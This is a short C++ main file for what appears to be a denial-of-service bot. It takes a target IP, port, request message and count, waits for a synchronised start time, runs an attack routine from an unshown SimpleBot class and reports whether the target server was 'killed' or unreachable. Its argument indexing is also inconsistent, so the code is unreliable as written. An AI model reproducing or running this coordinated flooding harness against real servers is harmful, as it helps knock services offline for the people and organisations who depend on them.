#include <stdlib.h>
#include <unistd.h>
#include <time.h>

#include "SimpleBot.h"

const int DELAY = 5;

int main(int argc, char *argv[]) {
    /*
     * Args: IP, Port, Request_Message, # of requests, Start_time
     */
    if (argc < 5) return -1;

    time_t cur_time, start_time = atoi(argv[3]);
    std::cout << start_time << std::endl;
    cur_time = time(NULL);
    while (cur_time < start_time){
        std::cout << "WAITING..." << std::endl;
        cur_time = time(NULL);
        sleep(1);
    }

    std::cout << "START BOT" << std::endl;
    SimpleBot bot(argv[1], argv[2], argv[5], argv[4]);
    ptime start = boost::posix_time::microsec_clock::universal_time();
    bot.attack();
    ptime finish = boost::posix_time::microsec_clock::universal_time();
    if(bot.serv_failed){
        std::cout << "SERVER KILLED" << std::endl;
    }
    if(bot.serv_unreach){
        std::cout << "TARGET UNREACHABLE" << std::endl;
    }
    boost::posix_time::time_duration td = finish - start;
    std::cout << "Time spent: " << td.total_milliseconds() << " millisec" << std::endl;

    return 0;
}
